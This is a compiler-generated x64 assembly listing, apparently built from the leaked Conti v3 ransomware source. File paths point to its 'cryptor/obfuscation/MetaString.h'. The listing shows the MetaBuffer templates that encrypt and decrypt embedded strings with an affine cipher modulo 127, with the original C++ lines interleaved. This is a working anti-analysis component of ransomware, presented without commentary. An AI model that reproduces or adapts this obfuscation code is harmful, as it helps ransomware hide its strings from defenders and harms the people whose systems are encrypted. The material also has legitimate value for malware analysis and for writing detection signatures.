  00047	c6 41 12 1f	 mov	 BYTE PTR [rcx+18], 31
  0004b	c6 41 13 53	 mov	 BYTE PTR [rcx+19], 83	; 00000053H
  0004f	c6 41 14 1f	 mov	 BYTE PTR [rcx+20], 31
  00053	c6 41 15 33	 mov	 BYTE PTR [rcx+21], 51	; 00000033H
  00057	c6 41 16 1f	 mov	 BYTE PTR [rcx+22], 31
  0005b	c6 41 17 23	 mov	 BYTE PTR [rcx+23], 35	; 00000023H
  0005f	c6 41 18 1f	 mov	 BYTE PTR [rcx+24], 31
  00063	c6 41 19 7a	 mov	 BYTE PTR [rcx+25], 122	; 0000007aH
  00067	c6 41 1a 1f	 mov	 BYTE PTR [rcx+26], 31
  0006b	c6 41 1b 39	 mov	 BYTE PTR [rcx+27], 57	; 00000039H
  0006f	c6 41 1c 1f	 mov	 BYTE PTR [rcx+28], 31
  00073	c6 41 1d 53	 mov	 BYTE PTR [rcx+29], 83	; 00000053H
  00077	c6 41 1e 1f	 mov	 BYTE PTR [rcx+30], 31
  0007b	c6 41 1f 78	 mov	 BYTE PTR [rcx+31], 120	; 00000078H
  0007f	c6 41 20 1f	 mov	 BYTE PTR [rcx+32], 31
  00083	c6 41 21 07	 mov	 BYTE PTR [rcx+33], 7
  00087	c6 41 22 1f	 mov	 BYTE PTR [rcx+34], 31
  0008b	c6 41 23 1f	 mov	 BYTE PTR [rcx+35], 31
  0008f	c6 41 24 1f	 mov	 BYTE PTR [rcx+36], 31
  00093	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00097	48 8b c1	 mov	 rax, rcx
  0009a	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 06 00 00
	00		 mov	 r11d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 08	 sub	 ecx, 8

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2a	 mov	 BYTE PTR [rcx+1], 42	; 0000002aH
  00007	c6 41 02 08	 mov	 BYTE PTR [rcx+2], 8
  0000b	c6 41 03 53	 mov	 BYTE PTR [rcx+3], 83	; 00000053H
  0000f	c6 41 04 08	 mov	 BYTE PTR [rcx+4], 8
  00013	c6 41 05 08	 mov	 BYTE PTR [rcx+5], 8
  00017	c6 41 06 08	 mov	 BYTE PTR [rcx+6], 8
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 1f	 sub	 eax, 31
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	ff c0		 inc	 eax
  00005	44 6b c0 1f	 imul	 r8d, eax, 31
  00009	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000e	41 f7 e0	 mul	 r8d
  00011	41 8b c8	 mov	 ecx, r8d
  00014	2b ca		 sub	 ecx, edx
  00016	d1 e9		 shr	 ecx, 1
  00018	03 ca		 add	 ecx, edx
  0001a	c1 e9 06	 shr	 ecx, 6
  0001d	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00020	44 2b c1	 sub	 r8d, ecx
  00023	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00027	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 08	 sub	 eax, 8
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 08	 add	 r8d, 8
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
END
